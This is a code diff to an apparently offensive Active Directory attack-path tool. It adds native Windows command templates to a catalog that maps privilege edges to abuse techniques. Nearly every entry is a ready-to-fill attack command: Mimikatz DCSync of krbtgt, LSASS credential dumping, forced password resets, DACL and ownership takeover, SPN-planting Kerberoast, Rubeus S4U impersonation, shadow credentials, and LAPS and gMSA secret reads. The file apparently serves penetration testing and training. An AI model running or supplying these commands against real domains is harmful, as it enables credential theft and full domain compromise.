@@ -38,6 +38,10 @@ class AbuseSpec:
     template: str                # fallback command (general knowledge), with {placeholders}
     needs_target: str = "any"    # 'user' | 'group' | 'computer' | 'domain' | 'any' (context)
     destructive: bool = False    # a real, high-impact change on the domain (UI marks it red)
+    # NATIVE WINDOWS variant — a PowerView / Rubeus / Mimikatz / PowerShell command that runs
+    # ON the Windows box over WinRM (the CRTP way), vs the Linux `template` that runs FROM Kali.
+    # The walk/orchestrator offers both; the human picks the transport. Same {placeholders}.
+    win_template: str = ""
 
 
 # The catalog. Keyed by edge kind; a few kinds specialize by target type via _specialize().
@@ -48,6 +52,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         tool="(none)",
         kb_seeds="active directory group membership privilege inheritance",
         template="# {source} is a member of {target} — its rights are already yours.",
+        win_template="# {source} is a member of {target} — rights already yours "
+                     "(PowerView: Get-DomainGroupMember -Identity '{target_sam}').",
     ),
     "ForceChangePassword": AbuseSpec(
         title="Force-change the target's password",
@@ -58,6 +64,8 @@ _CATALOG: dict[str, AbuseSpec] = {
                   "-U '{domain}/{source_sam}%<PASSWORD>' -S {dc}"),
         needs_target="user",
         destructive=True,
+        win_template=("Set-DomainUserPassword -Identity '{target_sam}' -AccountPassword "
+                      "(ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"),
     ),
     "GenericAll": AbuseSpec(
         title="Full control (GenericAll)",
@@ -66,6 +74,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         kb_seeds="GenericAll full control abuse reset password shadow credentials",
         template=("certipy shadow auto -u '{source_sam}@{domain}' -p '<PASSWORD>' "
                   "-account '{target_sam}' -dc-ip {dc}"),
+        win_template=("Set-DomainUserPassword -Identity '{target_sam}' -AccountPassword "
+                      "(ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"),
     ),
     "GenericWrite": AbuseSpec(
         title="Write attributes (GenericWrite)",
@@ -75,6 +85,9 @@ _CATALOG: dict[str, AbuseSpec] = {
         template=("python3 targetedKerberoast.py -v -d '{domain}' -u '{source_sam}' "
                   "-p '<PASSWORD>' --request-user '{target_sam}'"),
         needs_target="user",
+        win_template=("Set-DomainObject -Identity '{target_sam}' -Set "
+                      "@{serviceprincipalname='hackpit/svc'}; Rubeus.exe kerberoast "
+                      "/user:'{target_sam}' /nowrap"),
     ),
     "WriteDacl": AbuseSpec(
         title="Rewrite the DACL (WriteDacl)",
@@ -85,6 +98,8 @@ _CATALOG: dict[str, AbuseSpec] = {
                   "-principal '{source_sam}' -target '{target_sam}' "
                   "'{domain}/{source_sam}:<PASSWORD>'"),
         destructive=True,
+        win_template=("Add-DomainObjectAcl -TargetIdentity '{target_sam}' "
+                      "-PrincipalIdentity '{source_sam}' -Rights All"),
     ),
     "WriteOwner": AbuseSpec(
         title="Take ownership (WriteOwner)",
@@ -94,6 +109,9 @@ _CATALOG: dict[str, AbuseSpec] = {
         template=("impacket-owneredit -action write -new-owner '{source_sam}' "
                   "-target '{target_sam}' '{domain}/{source_sam}:<PASSWORD>'"),
         destructive=True,
+        win_template=("Set-DomainObjectOwner -Identity '{target_sam}' -OwnerIdentity "
+                      "'{source_sam}'; Add-DomainObjectAcl -TargetIdentity '{target_sam}' "
+                      "-PrincipalIdentity '{source_sam}' -Rights All"),
     ),
     "Owns": AbuseSpec(
         title="Ownership (Owns)",
@@ -104,6 +122,8 @@ _CATALOG: dict[str, AbuseSpec] = {
                   "-principal '{source_sam}' -target '{target_sam}' "
                   "'{domain}/{source_sam}:<PASSWORD>'"),
         destructive=True,
+        win_template=("Add-DomainObjectAcl -TargetIdentity '{target_sam}' "
+                      "-PrincipalIdentity '{source_sam}' -Rights All"),
     ),
     "AddMember": AbuseSpec(
         title="Add a member to the group",
@@ -114,6 +134,7 @@ _CATALOG: dict[str, AbuseSpec] = {
                   "-U '{domain}/{source_sam}%<PASSWORD>' -S {dc}"),
         needs_target="group",
         destructive=True,
+        win_template="Add-DomainGroupMember -Identity '{target_sam}' -Members '{source_sam}'",
     ),
     "AddSelf": AbuseSpec(
         title="Add yourself to the group",
@@ -124,6 +145,7 @@ _CATALOG: dict[str, AbuseSpec] = {
                   "add groupMember '{target_sam}' '{source_sam}'"),
         needs_target="group",
         destructive=True,
+        win_template="Add-DomainGroupMember -Identity '{target_sam}' -Members '{source_sam}'",
     ),
     "AddKeyCredentialLink": AbuseSpec(
         title="Shadow credentials (Key Credential Link)",
@@ -133,6 +155,7 @@ _CATALOG: dict[str, AbuseSpec] = {
         template=("certipy shadow auto -u '{source_sam}@{domain}' -p '<PASSWORD>' "
                   "-account '{target_sam}' -dc-ip {dc}"),
         destructive=True,
+        win_template="Whisker.exe add /target:'{target_sam}'",
     ),
     "AddAllowedToAct": AbuseSpec(
         title="Resource-based constrained delegation (write)",
@@ -143,6 +166,8 @@ _CATALOG: dict[str, AbuseSpec] = {
                   "-delegate-to '{target_sam}' '{domain}/{source_sam}:<PASSWORD>'"),
         needs_target="computer",
         destructive=True,
+        win_template=("Set-DomainRBCD -Identity '{target_sam}' -DelegateFrom "
+                      "'<ATTACKER_COMPUTER$>'"),
     ),
     "AllowedToAct": AbuseSpec(
         title="Resource-based constrained delegation",
@@ -152,6 +177,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         template=("impacket-getST -spn 'cifs/{target}' -impersonate Administrator "
                   "'{domain}/<ATTACKER_COMPUTER$>' -hashes :<HASH>"),
         needs_target="computer",
+        win_template=("Rubeus.exe s4u /user:'<ATTACKER_COMPUTER$>' /rc4:<HASH> "
+                      "/impersonateuser:Administrator /msdsspn:'cifs/{target}' /ptt"),
     ),
     "ReadLAPSPassword": AbuseSpec(
         title="Read the LAPS password",
@@ -160,6 +187,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         kb_seeds="LAPS read ms-Mcs-AdmPwd local administrator password abuse",
         template="nxc ldap {dc} -u '{source_sam}' -p '<PASSWORD>' --laps",
         needs_target="computer",
+        win_template=("Get-DomainObject -Identity '{target_sam}' -Properties "
+                      "'ms-Mcs-AdmPwd','name'"),
     ),
     "ReadGMSAPassword": AbuseSpec(
         title="Read the gMSA password",
@@ -167,6 +196,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         tool="gMSADumper / netexec",
         kb_seeds="gMSA managed service account read password gMSADumper msDS-ManagedPassword",
         template="python3 gMSADumper.py -u '{source_sam}' -p '<PASSWORD>' -d '{domain}'",
+        win_template=("Get-ADServiceAccount -Identity '{target_sam}' -Properties "
+                      "'msDS-ManagedPassword'"),
     ),
     "AllowedToDelegate": AbuseSpec(
         title="Constrained delegation (S4U)",
@@ -175,6 +206,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         kb_seeds="constrained delegation msDS-AllowedToDelegateTo S4U getST impersonate abuse",
         template=("impacket-getST -spn '{target_spn}' -impersonate Administrator "
                   "'{domain}/{source_sam}' -hashes :<HASH>"),
+        win_template=("Rubeus.exe s4u /user:'{source_sam}' /rc4:<HASH> "
+                      "/impersonateuser:Administrator /msdsspn:'{target_spn}' /ptt"),
     ),
     "HasSIDHistory": AbuseSpec(
         title="SID history",
@@ -182,6 +215,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         tool="(none)",
         kb_seeds="SID history sidhistory abuse access token",
         template="# {source} has {target} in SID history — use {source}'s creds; access is inherited.",
+        win_template="# {source} carries {target}'s SID in history — access is inherited "
+                     "(whoami /groups shows the SID).",
     ),
     "AdminTo": AbuseSpec(
         title="Local admin on the computer",
@@ -190,6 +225,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         kb_seeds="local admin lateral movement secretsdump psexec dump lsass credentials",
         template="nxc smb {target} -u '{source_sam}' -p '<PASSWORD>' --sam --lsa",
         needs_target="computer",
+        win_template=("Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'  "
+                      "# local admin on {target}"),
     ),
     "CanRDP": AbuseSpec(
         title="Remote Desktop (RDP)",
@@ -198,6 +235,7 @@ _CATALOG: dict[str, AbuseSpec] = {
         kb_seeds="RDP remote desktop interactive logon xfreerdp lateral",
         template="xfreerdp /u:'{source_sam}' /p:'<PASSWORD>' /d:'{domain}' /v:{target} +clipboard",
         needs_target="computer",
+        win_template="mstsc /v:{target}  # RDP as {source_sam}",
     ),
     "CanPSRemote": AbuseSpec(
         title="PowerShell Remoting (WinRM)",
@@ -206,6 +244,7 @@ _CATALOG: dict[str, AbuseSpec] = {
         kb_seeds="powershell remoting winrm evil-winrm lateral movement PSRemote",
         template="evil-winrm -i {target} -u '{source_sam}' -p '<PASSWORD>'",
         needs_target="computer",
+        win_template="Enter-PSSession -ComputerName {target}",
     ),
     "ExecuteDCOM": AbuseSpec(
         title="DCOM execution",
@@ -214,6 +253,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         kb_seeds="DCOM lateral movement dcomexec MMC20 ShellWindows execute",
         template="impacket-dcomexec -object MMC20 '{domain}/{source_sam}:<PASSWORD>@{target}'",
         needs_target="computer",
+        win_template="Invoke-Command -ComputerName {target} -ScriptBlock { whoami }  "
+                     "# or DCOM MMC20.Application",
     ),
     "HasSession": AbuseSpec(
         title="Harvest a session",
@@ -221,6 +262,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         tool="netexec / mimikatz",
         kb_seeds="session credential harvest lsass dump mimikatz logonpasswords token",
         template="nxc smb {source} -u '<LOCALADMIN>' -p '<PASSWORD>' -M lsassy",
+        win_template=("Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'  "
+                      "# harvest {target}'s session on {source}"),
     ),
     "DCSync": AbuseSpec(
         title="DCSync (replicate secrets)",
@@ -230,6 +273,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         template=("impacket-secretsdump -just-dc '{domain}/{source_sam}:<PASSWORD>@{dc}'"),
         needs_target="domain",
         destructive=True,
+        win_template=("Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:{domain} "
+                      "/user:{domain}\\krbtgt\"'"),
     ),
     "AllExtendedRights": AbuseSpec(
         title="All extended rights",
@@ -239,6 +284,8 @@ _CATALOG: dict[str, AbuseSpec] = {
         template=("net rpc password '{target_sam}' 'Newp@ss123!' "
                   "-U '{domain}/{source_sam}%<PASSWORD>' -S {dc}"),
         destructive=True,
+        win_template=("Set-DomainUserPassword -Identity '{target_sam}' -AccountPassword "
+                      "(ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"),
     ),
     "SQLAdmin": AbuseSpec(
         title="SQL sysadmin",
@@ -247,6 +294,7 @@ _CATALOG: dict[str, AbuseSpec] = {
         kb_seeds="mssql sysadmin xp_cmdshell code execution sql admin abuse",
         template="impacket-mssqlclient '{domain}/{source_sam}:<PASSWORD>@{target}' -windows-auth",
         needs_target="computer",
+        win_template="Invoke-SQLOSCmd -Instance '{target}' -Command 'whoami' -RawResults",
     ),
 }
 
@@ -346,6 +394,13 @@ def technique_for_edge(
         commands = [{"lang": "bash", "cmd": _fill(spec.template, ctx)}]
         why = why or "General-knowledge technique (no exact KB entry matched)."
 
+    # NATIVE WINDOWS variant — the CRTP command that runs ON the box over WinRM. Always from
+    # the catalog (deterministic), separate from the Linux `commands` so the walk can offer
+    # both and the human picks the transport. Empty when the edge has no native variant.
+    windows_commands: list[dict[str, Any]] = []
+    if spec.win_template:
+        windows_commands = [{"lang": "powershell", "cmd": _fill(spec.win_template, ctx)}]
+
     return {
         "kind": kind,
         "effective_kind": eff_kind,
@@ -358,6 +413,7 @@ def technique_for_edge(
         "entry_id": entry_id,
         "entry_title": entry_title,
         "commands": commands,
+        "windows_commands": windows_commands,
         "why": why,
     }
 
